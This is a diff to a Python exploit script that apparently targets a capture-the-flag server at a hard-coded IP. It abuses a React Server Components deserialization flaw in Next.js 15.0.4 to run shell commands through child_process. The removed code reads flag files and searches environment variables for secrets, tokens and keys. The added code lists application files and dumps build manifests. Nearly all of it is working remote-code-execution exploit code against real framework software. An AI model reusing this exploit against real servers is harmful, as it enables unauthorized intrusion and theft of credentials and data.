@@ -4,7 +4,6 @@ from __future__ import annotations
 
 import base64
 import json
-import re
 from pathlib import Path
 from typing import Any
 
@@ -14,19 +13,16 @@ import requests
 TARGET = "http://34.40.133.67:8080/"
 OUTPUT_DIR = Path("old-web-raw")
 OUTPUT_FILE = OUTPUT_DIR / "result.json"
-FLAG_PATTERN = re.compile(rb"bushbash\{[^\r\n\x00}]{1,256}\}")
-MAX_RESPONSE_BYTES = 512 * 1024
+MAX_RESPONSE_BYTES = 768 * 1024
 
 
 def run_command(command: str, label: str) -> dict[str, Any]:
-    # The command is JSON-encoded into a JavaScript string and passed as an
-    # argument to /bin/sh, avoiding interpolation into the shell source itself.
     encoded_command = json.dumps(command)
     prefix = (
         "var res=process.mainModule.require('child_process')"
         ".execFileSync('/bin/sh',['-c',"
         + encoded_command
-        + "],{timeout:5000,maxBuffer:524288}).toString().trim();"
+        + "],{timeout:8000,maxBuffer:786432}).toString().trim();"
         "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});"
     )
 
@@ -37,9 +33,7 @@ def run_command(command: str, label: str) -> dict[str, Any]:
         "value": '{"then":"$B0"}',
         "_response": {
             "_prefix": prefix,
-            "_formData": {
-                "get": "$1:constructor:constructor",
-            },
+            "_formData": {"get": "$1:constructor:constructor"},
         },
     }
 
@@ -48,21 +42,17 @@ def run_command(command: str, label: str) -> dict[str, Any]:
         "1": (None, '"$@0"'),
     }
 
-    result: dict[str, Any] = {
-        "label": label,
-        "command": command,
-    }
-
+    result: dict[str, Any] = {"label": label, "command": command}
     try:
         response = requests.post(
             TARGET,
             files=files,
             headers={
                 "Next-Action": "x",
-                "User-Agent": "Mozilla/5.0 (compatible; BushBash-CTF-React2Shell-check/1.0)",
+                "User-Agent": "Mozilla/5.0 (compatible; BushBash-CTF-build-inspection/1.0)",
                 "Connection": "close",
             },
-            timeout=(5, 12),
+            timeout=(5, 15),
             allow_redirects=False,
         )
         body = response.content[:MAX_RESPONSE_BYTES]
@@ -73,50 +63,41 @@ def run_command(command: str, label: str) -> dict[str, Any]:
                 "body_length": len(response.content),
                 "body_truncated": len(response.content) > len(body),
                 "body_b64": base64.b64encode(body).decode("ascii"),
-                "flags": sorted(
-                    {
-                        match.group(0).decode("ascii", errors="replace")
-                        for match in FLAG_PATTERN.finditer(response.content)
-                    }
-                ),
             }
         )
     except Exception as error:
         result["error"] = f"{type(error).__name__}: {error}"
-
     return result
 
 
 def main() -> None:
-    results: dict[str, Any] = {
+    file_list = (
+        "find /app -maxdepth 6 -type f ! -path '/app/node_modules/*' "
+        "-printf '%p %s\\n' 2>/dev/null | sort"
+    )
+
+    selected_files = (
+        "for f in "
+        "/app/package.json "
+        "/app/.next/server/app/page.js "
+        "/app/.next/server/app-paths-manifest.json "
+        "/app/.next/routes-manifest.json "
+        "/app/.next/required-server-files.json "
+        "/app/.next/server/server-reference-manifest.json "
+        "/app/.next/server/middleware-manifest.json "
+        "/app/.next/server/pages-manifest.json; do "
+        "if [ -f \"$f\" ]; then printf '\\n===== %s =====\\n' \"$f\"; cat \"$f\"; fi; "
+        "done"
+    )
+
+    results = {
         "target": TARGET,
         "framework": "Next.js 15.0.4 App Router",
-        "tests": [],
+        "tests": [
+            run_command(file_list, "application_file_list"),
+            run_command(selected_files, "selected_build_files"),
+        ],
     }
-
-    # Harmless capability marker first.
-    results["tests"].append(run_command("printf R2S_OK_1504", "marker"))
-
-    flag_command = (
-        "cat /flag /flag.txt /app/flag /app/flag.txt /tmp/flag /tmp/flag.txt "
-        "2>/dev/null; "
-        "printenv FLAG 2>/dev/null; "
-        "printenv | grep -o 'bushbash{[^}]*}' 2>/dev/null || true"
-    )
-    flag_result = run_command(flag_command, "standard_flag_locations")
-    results["tests"].append(flag_result)
-
-    if not flag_result.get("flags"):
-        discovery_command = (
-            "printf 'PWD='; pwd; "
-            "printf '\\nCANDIDATES\\n'; "
-            "find /app /workspace /tmp / -maxdepth 4 -type f "
-            "\\( -iname '*flag*' -o -name '.env' -o -name 'package.json' \\) "
-            "2>/dev/null | head -200; "
-            "printf '\\nENV_NAMES\\n'; "
-            "printenv | cut -d= -f1 | sort | grep -Ei 'flag|secret|key|token' || true"
-        )
-        results["tests"].append(run_command(discovery_command, "bounded_discovery"))
 
     OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
     OUTPUT_FILE.write_text(json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8")
